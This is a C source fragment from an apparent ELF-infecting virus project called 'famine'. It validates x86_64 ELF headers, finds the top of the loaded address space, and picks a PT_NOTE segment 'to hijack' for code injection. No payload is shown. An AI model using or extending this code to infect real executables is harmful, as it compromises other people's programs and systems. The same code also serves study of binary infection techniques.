#include "../include/famine.h"
#include <elf.h>

int is_valid_elf(const Elf64_Ehdr *elf)
{
	if (memcmp(elf->e_ident, ELFMAG, SELFMAG) != 0)
		return (LOG("not an ELF file\n"), 0);
	if (elf->e_ident[EI_CLASS] != ELFCLASS64)
		return (LOG("not a 64-bit ELF\n"), 0);
	if (elf->e_machine != EM_X86_64)
		return (LOG("unsupported architecture (x86_64 only)\n"), 0);
	if (elf->e_type != ET_EXEC && elf->e_type != ET_DYN)
		return (LOG("not an executable or PIE\n"), 0);
	return (1);
}

static uint64_t page_round_up(uint64_t x)
{
	return ((x + PAGE_SIZE - 1) & ~((uint64_t)PAGE_SIZE - 1));
}

/*
* @brief Highest vaddr any PT_LOAD occupies at runtime, rounded up to a page.
*/
uint64_t	highest_vaddr_end(const t_famine *f)
{
	uint64_t	top;
	uint64_t	end;

	top = 0;
	for (int i = 0; i < f->ehdr->e_phnum; i++)
	{
		if (f->phdr[i].p_type != PT_LOAD)
			continue ;
		end = f->phdr[i].p_vaddr + f->phdr[i].p_memsz;
		if (end > top)
			top = end;
	}
	return (page_round_up(top));
}

int find_segments(t_famine *f)
{
	f->note = NULL;
	f->phdr_vaddr = f->ehdr->e_phoff;
	for (int i = 0; i < f->ehdr->e_phnum; i++)
	{
		if (f->phdr[i].p_type == PT_NOTE && !f->note)
			f->note = &f->phdr[i];
		if (f->phdr[i].p_type == PT_PHDR)
			f->phdr_vaddr = f->phdr[i].p_vaddr;
	}
	if (!f->note)
		return (LOG("no PT_NOTE segment to hijack\n"), 1);
	if (f->stub_vaddr == 0)
		return (LOG("no PT_LOAD segment found\n"), 1);
	return (0);
}
